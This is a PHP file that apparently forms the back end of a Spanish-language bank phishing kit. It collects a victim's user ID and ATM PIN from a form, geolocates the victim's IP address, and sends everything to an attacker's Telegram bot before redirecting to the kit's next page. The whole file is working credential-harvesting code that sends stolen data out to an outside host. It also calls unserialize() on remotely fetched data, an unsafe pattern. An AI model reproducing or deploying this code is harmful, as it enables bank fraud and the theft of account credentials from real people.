<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip=' . $userp));
$pais = $meta['geoplugin_countryName'] ?? 'Desconocido';

include('datos_de_tel.php');

// Captura userid de los datos POST
$userid = $_POST['userid'] ?? 'No proporcionado';

if (isset($_POST['userclav'])) {
    $userclav = $_POST['userclav'];
    $message = "PIN\r\nUsuario: $userid\nPin Cajer0: $userclav\r\nIP: $userp $pais";

    $apiToken = $apibot;
    $data = [
        'chat_id' => $canal,
        'text' => $message
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));

    
    echo '<script type="text/javascript">window.location.href = "index6.php";</script>';
} else {
    header('Location: index6.php');
    exit();
}
?>
